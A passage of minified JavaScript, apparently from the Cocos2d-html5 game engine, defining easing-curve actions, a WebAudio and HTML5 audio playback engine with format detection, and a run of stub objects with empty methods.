            b = 0.5 > a ? 0.5 * (1 - this.Gc(1 - 2 * a)) : 0.5 * this.Gc(2 * a - 1) + 0.5;
        this.d.update(b)
    },
    clone: function() {
        var a = new cc.Zb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.Zb.create(this.d.reverse())
    }
});
cc.Zb.create = function(a) {
    return new cc.Zb(a)
};
cc.He = {
    i: function(a) {
        return a = 0.5 > a ? 0.5 * (1 - cc.gc(1 - 2 * a)) : 0.5 * cc.gc(2 * a - 1) + 0.5
    },
    reverse: function() {
        return cc.He
    }
};
cc.km = function() {
    return cc.He
};
cc.fb = cc.h.extend({
    update: function(a) {
        this.d.update(0 === a || 1 == a ? a : a * a * (2.70158 * a - 1.70158))
    },
    reverse: function() {
        return cc.Xb.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.fb;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.fb.create = function(a) {
    return new cc.fb(a)
};
cc.De = {
    i: function(a) {
        return 0 === a || 1 === a ? a : a * a * (2.70158 * a - 1.70158)
    },
    reverse: function() {
        return cc.Fe
    }
};
cc.gm = function() {
    return cc.De
};
cc.Xb = cc.h.extend({
    update: function(a) {
        a -= 1;
        this.d.update(a * a * (2.70158 * a + 1.70158) + 1)
    },
    reverse: function() {
        return cc.fb.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.Xb;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.Xb.create = function(a) {
    return new cc.Xb(a)
};
cc.Fe = {
    i: function(a) {
        a -= 1;
        return a * a * (2.70158 * a + 1.70158) + 1
    },
    reverse: function() {
        return cc.De
    }
};
cc.im = function() {
    return cc.Fe
};
cc.Wb = cc.h.extend({
    update: function(a) {
        a *= 2;
        1 > a ? this.d.update(a * a * (3.5949095 * a - 2.5949095) / 2) : (a -= 2, this.d.update(a * a * (3.5949095 * a + 2.5949095) / 2 + 1))
    },
    clone: function() {
        var a = new cc.Wb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.Wb.create(this.d.reverse())
    }
});
cc.Wb.create = function(a) {
    return new cc.Wb(a)
};
cc.Ee = {
    i: function(a) {
        a *= 2;
        if (1 > a) return a * a * (3.5949095 * a - 2.5949095) / 2;
        a -= 2;
        return a * a * (3.5949095 * a + 2.5949095) / 2 + 1
    },
    reverse: function() {
        return cc.Ee
    }
};
cc.hm = function() {
    return cc.Ee
};
cc.gb = cc.h.extend({
    uc: g,
    vc: g,
    wc: g,
    xc: g,
    ctor: function(a) {
        cc.h.prototype.ctor.call(this, a)
    },
    f: function(a, b, c, d, f) {
        return Math.pow(1 - f, 3) * a + 3 * f * Math.pow(1 - f, 2) * b + 3 * Math.pow(f, 2) * (1 - f) * c + Math.pow(f, 3) * d
    },
    update: function(a) {
        this.d.update(this.f(this.uc, this.vc, this.wc, this.xc, a))
    },
    clone: function() {
        var a = new cc.gb;
        a.initWithAction(this.d.clone());
        a.Yf(this.uc, this.vc, this.wc, this.xc);
        return a
    },
    reverse: function() {
        var a = cc.gb.create(this.d.reverse());
        a.Yf(this.xc, this.wc, this.vc, this.uc);
        return a
    },
    Yf: function(a, b, c, d) {
        this.uc = a || 0;
        this.vc = b || 0;
        this.wc = c || 0;
        this.xc = d || 0
    }
});
cc.gb.create = function(a) {
    return new cc.gb(a)
};
cc.ci = function(a, b, c, d) {
    return {
        i: function(f) {
            return cc.gb.prototype.f(a, b, c, d, f)
        },
        reverse: function() {
            return cc.ci(d, c, b, a)
        }
    }
};
cc.pb = cc.h.extend({
    f: function(a) {
        return Math.pow(a, 2)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.pb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.pb.create(this.d.reverse())
    }
});
cc.pb.create = function(a) {
    return new cc.pb(a)
};
cc.Ue = {
    i: cc.pb.prototype.f,
    reverse: function() {
        return cc.Ue
    }
};
cc.vm = function() {
    return cc.Ue
};
cc.rb = cc.h.extend({
    f: function(a) {
        return -a * (a - 2)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.rb;
        a.initWithAction();
        return a
    },
    reverse: function() {
        return cc.rb.create(this.d.reverse())
    }
});
cc.rb.create = function(a) {
    return new cc.rb(a)
};
cc.We = {
    i: cc.rb.prototype.f,
    reverse: function() {
        return cc.We
    }
};
cc.xm = function() {
    return cc.We
};
cc.qb = cc.h.extend({
    f: function(a) {
        var b = a;
        a *= 2;
        1 > a ? b = 0.5 * a * a : (--a, b = -0.5 * (a * (a - 2) - 1));
        return b
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.qb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.qb.create(this.d.reverse())
    }
});
cc.qb.create = function(a) {
    return new cc.qb(a)
};
cc.Ve = {
    i: cc.qb.prototype.f,
    reverse: function() {
        return cc.Ve
    }
};
cc.wm = function() {
    return cc.Ve
};
cc.sb = cc.h.extend({
    f: function(a) {
        return a * a * a * a
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.sb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.sb.create(this.d.reverse())
    }
});
cc.sb.create = function(a) {
    return new cc.sb(a)
};
cc.Xe = {
    i: cc.sb.prototype.f,
    reverse: function() {
        return cc.Xe
    }
};
cc.ym = function() {
    return cc.Xe
};
cc.ub = cc.h.extend({
    f: function(a) {
        a -= 1;
        return -(a * a * a * a - 1)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.ub;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.ub.create(this.d.reverse())
    }
});
cc.ub.create = function(a) {
    return new cc.ub(a)
};
cc.Ze = {
    i: cc.ub.prototype.f,
    reverse: function() {
        return cc.Ze
    }
};
cc.Am = function() {
    return cc.Ze
};
cc.tb = cc.h.extend({
    f: function(a) {
        a *= 2;
        if (1 > a) return 0.5 * a * a * a * a;
        a -= 2;
        return -0.5 * (a * a * a * a - 2)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.tb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.tb.create(this.d.reverse())
    }
});
cc.tb.create = function(a) {
    return new cc.tb(a)
};
cc.Ye = {
    i: cc.tb.prototype.f,
    reverse: function() {
        return cc.Ye
    }
};
cc.zm = function() {
    return cc.Ye
};
cc.vb = cc.h.extend({
    f: function(a) {
        return a * a * a * a * a
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.vb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.vb.create(this.d.reverse())
    }
});
cc.vb.create = function(a) {
    return new cc.vb(a)
};
cc.$e = {
    i: cc.vb.prototype.f,
    reverse: function() {
        return cc.$e
    }
};
cc.Bm = function() {
    return cc.$e
};
cc.xb = cc.h.extend({
    f: function(a) {
        a -= 1;
        return a * a * a * a * a + 1
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.xb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.xb.create(this.d.reverse())
    }
});
cc.xb.create = function(a) {
    return new cc.xb(a)
};
cc.bf = {
    i: cc.xb.prototype.f,
    reverse: function() {
        return cc.bf
    }
};
cc.Dm = function() {
    return cc.bf
};
cc.wb = cc.h.extend({
    f: function(a) {
        a *= 2;
        if (1 > a) return 0.5 * a * a * a * a * a;
        a -= 2;
        return 0.5 * (a * a * a * a * a + 2)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.wb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.wb.create(this.d.reverse())
    }
});
cc.wb.create = function(a) {
    return new cc.wb(a)
};
cc.af = {
    i: cc.wb.prototype.f,
    reverse: function() {
        return cc.af
    }
};
cc.Cm = function() {
    return cc.af
};
cc.hb = cc.h.extend({
    f: function(a) {
        return -1 * (Math.sqrt(1 - a * a) - 1)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.hb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.hb.create(this.d.reverse())
    }
});
cc.hb.create = function(a) {
    return new cc.hb(a)
};
cc.Je = {
    i: cc.hb.prototype.f,
    reverse: function() {
        return cc.Je
    }
};
cc.mm = function() {
    return cc.Je
};
cc.jb = cc.h.extend({
    f: function(a) {
        a -= 1;
        return Math.sqrt(1 - a * a)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.jb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.jb.create(this.d.reverse())
    }
});
cc.jb.create = function(a) {
    return new cc.jb(a)
};
cc.Le = {
    i: cc.jb.prototype.f,
    reverse: function() {
        return cc.Le
    }
};
cc.om = function() {
    return cc.Le
};
cc.ib = cc.h.extend({
    f: function(a) {
        a *= 2;
        if (1 > a) return -0.5 * (Math.sqrt(1 - a * a) - 1);
        a -= 2;
        return 0.5 * (Math.sqrt(1 - a * a) + 1)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.ib;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.ib.create(this.d.reverse())
    }
});
cc.ib.create = function(a) {
    return new cc.ib(a)
};
cc.Ke = {
    i: cc.ib.prototype.f,
    reverse: function() {
        return cc.Ke
    }
};
cc.nm = function() {
    return cc.Ke
};
cc.kb = cc.h.extend({
    f: function(a) {
        return a * a * a
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.kb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.kb.create(this.d.reverse())
    }
});
cc.kb.create = function(a) {
    return new cc.kb(a)
};
cc.Me = {
    i: cc.kb.prototype.f,
    reverse: function() {
        return cc.Me
    }
};
cc.pm = function() {
    return cc.Me
};
cc.mb = cc.h.extend({
    f: function(a) {
        a -= 1;
        return a * a * a + 1
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.mb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.mb.create(this.d.reverse())
    }
});
cc.mb.create = function(a) {
    return new cc.mb(a)
};
cc.Oe = {
    i: cc.mb.prototype.f,
    reverse: function() {
        return cc.Oe
    }
};
cc.rm = function() {
    return cc.Oe
};
cc.lb = cc.h.extend({
    f: function(a) {
        a *= 2;
        if (1 > a) return 0.5 * a * a * a;
        a -= 2;
        return 0.5 * (a * a * a + 2)
    },
    update: function(a) {
        this.d.update(this.f(a))
    },
    clone: function() {
        var a = new cc.lb;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.lb.create(this.d.reverse())
    }
});
cc.lb.create = function(a) {
    return new cc.lb(a)
};
cc.Ne = {
    i: cc.lb.prototype.f,
    reverse: function() {
        return cc.Ne
    }
};
cc.qm = function() {
    return cc.Ne
};
if (cc.sys._supportWebAudio) {
    var w = cc.Fr = new(window.AudioContext || window.webkitAudioContext || window.mozAudioContext);
    cc.Zc = cc.Class.extend({
        Wa: g,
        Sa: g,
        Da: g,
        Md: g,
        src: g,
        preload: g,
        autoplay: g,
        controls: g,
        pp: g,
        currentTime: 0,
        startTime: 0,
        duration: 0,
        rc: g,
        Ld: 1,
        yc: 0,
        _paused: h,
        Pb: e,
        T: -1,
        ctor: function(a) {
            this.Wa = {};
            this.src = a;
            this.Md = w.createGain ? w.createGain() : w.createGainNode();
            this.uh = this.th.bind(this);
            this.sh = this.rh.bind(this)
        },
        zd: function(a) {
            var b = this.Da = w.createBufferSource(),
                c = this.Md;
            a = a || 0;
            b.buffer = this.Sa;
            c.gain.value = this.Ld;
            b.connect(c);
            c.connect(w.destination);
            b.loop = this.rc;
            this.Pb = this._paused = h;
            b.start ? b.start(0, a) : b.noteGrainOn ? (c = b.buffer.duration, this.loop ? b.noteGrainOn(0, a, c) : b.noteGrainOn(0, a, c - a)) : b.noteOn(0);
            this.yc = 0
        },
        wf: function() {
            var a = this.Da;
            this.Pb || (a.stop ? a.stop(0) : a.noteOff(0), this.Pb = e)
        },
        play: function() {
            if (-1 == this.T) this.T = 0;
            else if (1 == this.T) {
                var a = this.Da;
                if (this.Pb || !(a && 2 == a.playbackState)) this.startTime = w.currentTime, this.zd(0)
            }
        },
        pause: function() {
            this.yc = w.currentTime;
            this._paused = e;
            this.wf()
        },
        resume: function() {
            this._paused && this.zd(this.Sa ? (this.yc - this.startTime) % this.Sa.duration : 0)
        },
        stop: function() {
            this.yc = 0;
            this._paused = h;
            this.wf()
        },
        load: function() {
            var a = this;
            if (1 != a.T) {
                a.T = -1;
                a.played = h;
                a.ended = e;
                var b = new XMLHttpRequest;
                b.open("GET", a.src, e);
                b.responseType = "arraybuffer";
                b.onload = function() {
                    w.decodeAudioData(b.response, a.uh, a.sh)
                };
                b.send()
            }
        },
        addEventListener: function(a, b) {
            this.Wa[a] = b.bind(this)
        },
        removeEventListener: function(a) {
            delete this.Wa[a]
        },
        Nl: function() {
            return cc.sys._supportWebAudio
        },
        th: function(a) {
            this.Sa = a;
            a = this.Wa.success;
            var b = this.Wa.canplaythrough;
            a && a();
            b && b();
            (0 == this.T || "autoplay" == this.autoplay || this.autoplay == e) && this.zd();
            this.T = 1
        },
        rh: function() {
            var a = this.Wa.error;
            a && a();
            this.T = -2
        },
        cloneNode: function() {
            var a = new cc.Zc(this.src);
            a.volume = this.volume;
            a.T = this.T;
            a.Sa = this.Sa;
            (0 == a.T || -1 == a.T) && a.load();
            return a
        }
    });
    t = cc.Zc.prototype;
    cc.defineGetterSetter(t, "loop", p("rc"), function(a) {
        this.rc = a;
        this.Da && (this.Da.loop = a)
    });
    cc.defineGetterSetter(t, "volume", p("Ld"), function(a) {
        this.Ld = a;
        this.Md.gain.value = a
    });
    cc.defineGetterSetter(t, "paused", p("_paused"));
    cc.defineGetterSetter(t, "ended", function() {
        var a = this.Da;
        return !this._paused && (this.Pb || !a || 3 == a.playbackState)
    });
    cc.defineGetterSetter(t, "played", function() {
        var a = this.Da;
        return a && 2 == a.playbackState
    })
}
cc.ke = cc.Class.extend({
    Gd: h,
    A: g,
    jc: g,
    J: 0,
    xe: 0,
    C: {},
    Bb: {},
    oc: 1,
    wd: 5,
    ja: g,
    Kb: [],
    ctor: function() {
        this.Gd = 0 < cc.$c.Dc.length;
        this.ja && (this.ja = this.ja.bind(this))
    },
    Gr: q(h),
    cn: p("oc"),
    Lc: function(a, b) {
        if (this.Gd) {
            var c = this.A;
            c && this.oa(c);
            a != this.jc && (this.A = c = this.kd(a), this.jc = a);
            c && (c.loop = b || h, this.Za(c))
        }
    },
    kd: function(a) {
        var b = cc.loader,
            c = b.getRes(a);
        c || (b.load(a), c = b.getRes(a));
        return c
    },
    Za: function(a) {
        a.ended || (a.stop ? a.stop() : (a.pause(), a.currentTime = 0));
        this.J = 2;
        a.play()
    },
    eb: function(a) {
        if (0 < this.J) {
            var b = this.A;
            b && this.oa(b) && (a && cc.loader.release(this.jc), this.jc = this.A = g, this.J = 0)
        }
    },
    oa: function(a) {
        return a && !a.ended ? (a.stop ? a.stop() : a.duration && Infinity != a.duration ? a.currentTime = a.duration : a.pause(), e) : h
    },
    Qf: function() {
        2 == this.J && (this.A.pause(), this.J = 1)
    },
    Nj: function() {
        1 == this.J && (this.ha(this.A), this.J = 2)
    },
    ha: function(a) {
        a && !a.ended && (a.resume ? a.resume() : a.play())
    },
    Yp: function() {
        this.A && this.Za(this.A)
    },
    Df: function() {
        return 0 == this.J ? 0 : this.A.volume
    },
    Pc: function(a) {
        0 < this.J && (this.A.volume = Math.min(Math.max(a, 0), 1))
    },
    Wd: function() {
        return 2 == this.J && this.A && !this.A.ended
    },
    ld: function(a) {
        var b = this.Bb[a];
        b || (b = this.Bb[a] = []);
        return b
    },
    gf: function(a) {
        var b;
        if (!this.Gd) return g;
        for (var c = this.ld(a), d = 0, f = c.length; d < f; d++) {
            var l = c[d];
            if (l.ended) {
                b = l;
                b.currentTime = 0;
                window.Ql && b.load();
                break
            }
        }
        if (!b) {
            if (c.length >= this.wd) return cc.log("Error: " + a + " greater than " + this.wd), g;
            b = this.kd(a);
            if (!b) return g;
            b = b.cloneNode(e);
            this.ja && cc._addEventListener(b, "pause", this.ja);
            b.volume = this.oc;
            c.push(b)
        }
        return b
    },
    da: function(a, b) {
        var c = this.gf(a);
        if (!c) return g;
        c.loop = b || h;
        c.play();
        var d = this.xe++;
        this.C[d] = c;
        return d
    },
    Zf: function(a) {
        a = this.oc = Math.min(Math.max(a, 0), 1);
        var b = this.C,
            c;
        for (c in b) b[c].volume = a
    },
    sj: function(a) {
        (a = this.C[a]) && !a.ended && a.pause()
    },
    rj: function() {
        var a = this.C,
            b;
        for (b in a) {
            var c = a[b];
            c.ended || c.pause()
        }
    },
    Mj: function(a) {
        this.ha(this.C[a])
    },
    Lj: function() {
        var a = this.C,
            b;
        for (b in a) this.ha(a[b])
    },
    Tc: function(a) {
        this.oa(this.C[a]);
        delete this.C[a]
    },
    Vb: function() {
        var a = this.C,
            b;
        for (b in a) this.oa(a[b]), delete a[b]
    },
    jk: function(a) {
        var b = cc.loader,
            c = this.C,
            d = this.ld(a);
        b.release(a);
        if (0 != d.length) {
            b = d[0].src;
            delete this.Bb[a];
            for (var f in c) c[f].src == b && (this.oa(c[f]), delete c[f])
        }
    },
    end: function() {
        this.eb();
        this.Vb()
    },
    rf: function() {
        var a = this.C,
            b, c;
        for (c in a) if ((b = a[c]) && !b.ended && !b.paused) this.Kb.push(b), b.pause();
        this.Wd() && (this.Kb.push(this.A), this.A.pause())
    },
    sf: function() {
        for (var a = this.Kb, b = 0, c = a.length; b < c; b++) this.ha(a[b]);
        a.length = 0
    }
});
!cc.sys._supportWebAudio && 0 > cc.sys._supportMultipleAudio && (cc.le = cc.ke.extend({
    ra: [],
    Jb: [],
    N: g,
    wd: 2,
    nc: {},
    Ba: h,
    Xa: 0,
    rd: h,
    Za: function(a) {
        this.Jd();
        this._super(a)
    },
    Nj: function() {
        1 == this.J && (this.Jd(), this.Ba = h, this.Xa = 0, this._super())
    },
    da: function(a, b) {
        var c = this.N,
            d = b ? this.gf(a) : this.kh(a);
        if (!d) return g;
        d.loop = b || h;
        var f = this.xe++;
        this.C[f] = d;
        this.Wd() && (this.Qf(), this.Ba = e);
        c ? (c != d && this.ra.push(this.Ua), this.ra.push(f), c.pause()) : (this.N = d, this.Ua = f, d.play());
        return f
    },
    sj: function() {
        cc.log("pauseEffect not supported in single audio mode!")
    },
    rj: function() {
        var a = this.ra,
            b = this.Jb,
            c = this.N;
        if (c) {
            for (var d = 0, f = a.length; d < f; d++) b.push(a[d]);
            a.length = 0;
            b.push(this.Ua);
            c.pause()
        }
    },
    Mj: function() {
        cc.log("resumeEffect not supported in single audio mode!")
    },
    Lj: function() {
        var a = this.ra,
            b = this.Jb;
        this.Wd() && (this.Qf(), this.Ba = e);
        for (var c = 0, d = b.length; c < d; c++) a.push(b[c]);
        b.length = 0;
        if (!this.N && 0 <= a.length && (a = a.pop(), b = this.C[a])) this.Ua = a, this.N = b, this.ha(b)
    },
    Tc: function(a) {
        var b = this.N,
            c = this.ra,
            d = this.Jb;
        b && this.Ua == a ? this.oa(b) : (b = c.indexOf(a), 0 <= b ? c.splice(b, 1) : (b = d.indexOf(a), 0 <= b && d.splice(b, 1)))
    },
    Vb: function() {
        this.Jd();
        !this.N && this.Ba && (this.ha(this.A), this.J = 2, this.Ba = h, this.Xa = 0)
    },
    jk: function(a) {
        var b = cc.loader,
            c = this.C,
            d = this.nc,
            f = this.ld(a),
            l = this.N;
        b.release(a);
        if (0 != f.length || d[a]) {
            b = 0 < f.length ? f[0].src : d[a].src;
            delete this.Bb[a];
            delete d[a];
            for (var m in c) c[m].src == b && delete c[m];
            l && l.src == b && this.oa(l)
        }
    },
    kh: function(a) {
        var b = this.nc[a],
            c = this.ra,
            d = this.Jb,
            f = this.C;
        if (b) b.currentTime = 0;
        else {
            b = this.kd(a);
            if (!b) return g;
            b = b.cloneNode(e);
            this.ja && cc._addEventListener(b, "pause", this.ja);
            b.volume = this.oc;
            this.nc[a] = b
        }
        a = 0;
        for (var l = c.length; a < l;) f[c[a]] == b ? c.splice(a, 1) : a++;
        a = 0;
        for (l = d.length; a < l;) f[d[a]] == b ? d.splice(a, 1) : a++;
        b.Fb = e;
        return b
    },
    Jd: function() {
        var a = this.N,
            b = this.Bb,
            c = this.nc,
            d = this.ra,
            f = this.Jb;
        if (a || !(0 == d.length && 0 == f.length)) {
            for (var l in c) {
                var m = c[l];
                m.duration && Infinity != m.duration && (m.currentTime = m.duration)
            }
            d.length = 0;
            f.length = 0;
            for (l in b) {
                c = b[l];
                d = 0;
                for (f = c.length; d < f; d++) m = c[d], m.loop = h, m.duration && Infinity != m.duration && (m.currentTime = m.duration)
            }
            a && this.oa(a)
        }
    },
    ja: function() {
        if (!this.rd) {
            var a = this.lh();
            if (a) a.Fb ? (delete a.Fb, a.play()) : this.ha(a);
            else if (this.Ba) {
                a = this.A;
                if (a.duration && Infinity != a.duration) {
                    var b = a.currentTime + this.Xa,
                        b = b - a.duration * (b / a.duration | 0);
                    a.currentTime = b
                }
                this.Xa = 0;
                this.ha(a);
                this.J = 2;
                this.Ba = h
            }
        }
    },
    lh: function() {
        var a = this.ra,
            b = this.C,
            c = this.N,
            d = c ? c.currentTime - (c.startTime || 0) : 0;
        for (this.Xa += d; 0 != a.length;) {
            var f = a.pop();
            if (c = b[f]) {
                if (c.Fb || c.loop || c.duration && c.currentTime + d < c.duration) return this.Ua = f, this.N = c, !c.Fb && (c.duration && Infinity != c.duration) && (a = c.currentTime + d, a -= c.duration * (a / c.duration | 0), c.currentTime = a), c.Fb = h, c;
                c.duration && Infinity != c.duration && (c.currentTime = c.duration)
            }
        }
        return this.N = this.Ua = g
    },
    rf: function() {
        var a = this.N;
        this.rd = e;
        if (a = 2 == this.J ? this.A : a) this.Kb.push(a), a.pause()
    },
    sf: function() {
        var a = this.Kb;
        this.rd = h;
        0 < a.length && (this.ha(a[0]), a.length = 0)
    }
}));
cc.$c = {
    Dc: g,
    Qm: function() {
        return cc.loader.audioPath
    },
    vd: function(a, b, c, d, f, l, m) {
        var r = this,
            s = cc.loader,
            u = cc.path,
            v = this.Dc,
            z = "";
        if (0 == v.length) return m("can not support audio!");
        if (-1 == d) z = (u.extname(a) || "").toLowerCase(), r.Mh(z) || (z = v[0], d = 0);
        else if (d < v.length) z = v[d];
        else return m("can not found the resource of audio! Last match url is : " + a);
        if (0 <= f.indexOf(z)) return r.vd(a, b, c, d + 1, f, l, m);
        a = u.changeExtname(a, z);
        f.push(z);
        l = r.qh(a, l, function(s) {
            if (s) return r.vd(a, b, c, d + 1, f, l, m);
            m(g, l)
        }, d == v.length - 1);
        s.cache[b] = l
    },
    Mh: function(a) {
        return !a ? h : 0 <= this.Dc.indexOf(a.toLowerCase())
    },
    qh: function(a, b, c, d) {
        var f = "file://" == location.origin ? Audio : cc.Zc || Audio;
        2 == arguments.length ? (c = b, b = new f) : 3 < arguments.length && !b && (b = new f);
        b.src = a;
        b.preload = "auto";
        f = navigator.userAgent;
        /Mobile/.test(f) && (/iPhone OS/.test(f) || /iPad/.test(f) || /Firefox/.test(f)) || /MSIE/.test(f) ? (b.load(), c(g, b)) : (cc._addEventListener(b, "canplaythrough", function() {
            c(g, b);
            this.removeEventListener("canplaythrough", arguments.callee, h);
            this.removeEventListener("error", arguments.callee, h)
        }, h), cc._addEventListener(b, "error", function() {
            c("load " + a + " failed");
            d && (this.removeEventListener("canplaythrough", arguments.callee, h), this.removeEventListener("error", arguments.callee, h))
        }, h), b.load());
        return b
    },
    load: function(a, b, c, d) {
        this.vd(a, b, c, -1, [], g, d)
    }
};
cc.$c.Dc = function() {
    var a = cc.newElement("audio"),
        b = [];
    if (a.canPlayType) {
        var c = function(b) {
            b = a.canPlayType(b);
            return "no" != b && "" != b
        };
        c('audio/ogg; codecs="vorbis"') && b.push(".ogg");
        c("audio/mpeg") && b.push(".mp3");
        c('audio/wav; codecs="1"') && b.push(".wav");
        c("audio/mp4") && b.push(".mp4");
        (c("audio/x-m4a") || c("audio/aac")) && b.push(".m4a")
    }
    return b
}();
cc.loader.register(["mp3", "ogg", "wav", "mp4", "m4a"], cc.$c);
cc.L = cc.le ? new cc.le : new cc.ke;
cc.eventManager.addCustomListener(cc.game.EVENT_HIDE, function() {
    cc.L.rf()
});
cc.eventManager.addCustomListener(cc.game.EVENT_SHOW, function() {
    cc.L.sf()
});
var x = x || {};
x.xa = {
    qp: k(),
    op: function() {
        return this
    },
    Fp: k(),
    Vl: function() {
        return this
    },
    Mq: k(),
    an: function() {
        return this
    },
    sl: function() {
        return this
    },
    qi: function() {
        return this
    },
    Pp: k(),
    Ul: k(),
    Pn: function() {
        return this
    },
    Gi: function() {
        return this
    },
    no: function() {
        return this
    },
    Ar: function() {
        return this
    },
    Pm: function() {
        return this
    },
    qn: function() {
        return this
    },
    Ll: function() {
        return this
    },
    np: function() {
        return this
    },
    $m: function() {
        return this
    },
    jp: k(),
    Rl: function() {
        return this
    },
    ro: function() {
        return this
    },
    er: k(),
    bn: function() {
        return this
    }
};
x.Wk = {
    B: k(),
    init: function() {
        return this
    },
    Ml: k(),
    bq: k(),
    l: function() {
        return this
    },
    Ck: k()
};
x.tl = {
    ji: k(),
    pi: function() {
        return this
    },
    Ph: k(),
    Jm: k(),
    ip: k(),
    ni: function() {
        return this
    },
    pq: k(),
    init: function() {
        return this
    },
    Vq: k(),
    fk: k(),
    hn: function() {
        return this
    },
    kp: k(),
    B: k(),
    li: function() {
        return this
    },
    gr: k(),
    Km: k(),
    lp: k(),
    fj: function() {
        return this
    },
    l: function() {
        return this
    },
    Qk: k()
};
x.pl = {
    Gq: k(),
    wr: k(),
    qr: k(),
    Ia: k(),
    vr: k(),
    fk: k(),
    sr: k(),
    jq: k(),
    fj: function() {
        return this
    },
    xr: k(),
    pi: function() {
        return this
    },
    Zj: k(),
    init: function() {
        return this
    },
    B: k(),
    pr: k(),
    tr: k(),
    ni: function() {
        return this
    },
    kq: k(),
    rr: k(),
    yr: k(),
    li: function() {
        return this
    },
    ur: k(),
    l: function() {
        return this
    },
    Pk: k()
};
x.X = {
    Dj: k(),
    cr: k(),
    $q: k(),
    br: k(),
    init: function() {
        return this
    },
    Ep: k(),
    B: k(),
    l: function() {
        return this
    },
    Lk: k()
};
x.kl = {
    B: k(),
    init: function() {
        return this
    },
    Dj: k(),
    l: function() {
        return this
    },
    Mk: k()
};
x.tk = {
    lr: k(),
    create: function() {
        return this
    },
    yk: k()
};
x.ll = {
    io: k(),
    Sb: function() {
        return this
    },
    ho: k(),
    ko: function() {
        return this
    },
    oj: k(),
    Lp: k(),
    Nk: k()
};
x.ml = {
    Sb: function() {
        return this
    },
    l: function() {
        return this
    }
};
x.nl = {
    hq: k(),
    Sb: function() {
        return this
    },
    Zm: function() {
        return this
    },
    l: function() {
        return this
    }
};
x.ol = {
    Sb: function() {
        return this
    },
    l: function() {
        return this
    }
};
x.qg = {
    dm: function() {
        return this
    },
    init: function() {
        return this
    },
    qq: k(),
    nj: function() {
        return this
    },
    B: k(),
    l: function() {
        return this
    },
    zk: k()
};
x.gl = {
    ji: k(),
    Cq: k(),
    zn: function() {
        return this
    },
    rq: k(),
    Wp: k(),
    Dn: function() {
        return this
    },
    Mp: k(),
    Tn: function() {
        return this
    },
    nq: k(),
    dq: k(),
    Fl: k(),
    init: function() {
        return this
    },
    Vn: function() {
        return this
    },
    Fq: k(),
    Jq: k(),
    yn: function() {
        return this
    },
    $n: function() {
        return this
    },
    Oq: k(),
    Zn: function() {
        return this
    },
    fr: k(),
    Xq: k(),
    Hn: function() {
        return this
    },
    uq: k(),
    zr: k(),
    Hm: k(),
    fn: function() {
        return this
    },
    Il: k(),
    vp: k(),
    Wq: k(),
    Eq: k(),
    Hl: k(),
    mq: k(),
    kn: function() {
        return this
    },
    lo: function() {
        return this
    },
    Un: function() {
        return this
    },
    An: function() {
        return this
    },
    nn: function() {
        return this
    },
    oj: k(),
    Ik: k()
};
x.fl = {
    Dq: k(),
    l: function() {
        return this
    }
};
x.ue = {
    Vb: k(),
    hk: k(),
    Xj: k(),
    Pc: k(),
    de: k(),
    Tc: k(),
    ri: function() {
        return this
    },
    zj: function() {
        return this
    },
    Df: function() {
        return this
    },
    eb: k(),
    dump: k(),
    ti: function() {
        return this
    },
    ce: k(),
    Lc: k(),
    Yj: k(),
    xj: k(),
    B: k(),
    si: function() {
        return this
    },
    Rh: k(),
    da: function() {
        return this
    },
    Ih: k(),
    gk: k(),
    init: function() {
        return this
    },
    Td: function() {
        return this
    },
    l: function() {
        return this
    },
    Ok: k()
};
x.sk = {
    B: k(),
    init: function() {
        return this
    },
    dr: k(),
    Ub: k(),
    l: function() {
        return this
    },
    xk: k()
};
x.Xk = {
    Ub: k(),
    Sc: k(),
    Hc: k()
};
x.Yk = {
    Hc: k(),
    init: function() {
        return this
    },
    Sc: k(),
    B: k(),
    Ub: k(),
    l: function() {
        return this
    },
    Dk: k()
};
x.Zk = {
    Hc: k(),
    init: function() {
        return this
    },
    Sc: k(),
    B: k(),
    Ub: k(),
    l: function() {
        return this
    },
    Ek: k()
};
x.al = {
    Hc: k(),
    init: function() {
        return this
    },
    Sc: k(),
    B: k(),
    Ub: k(),
    l: function() {
        return this
    },
    Gk: k()
};
x.$k = {
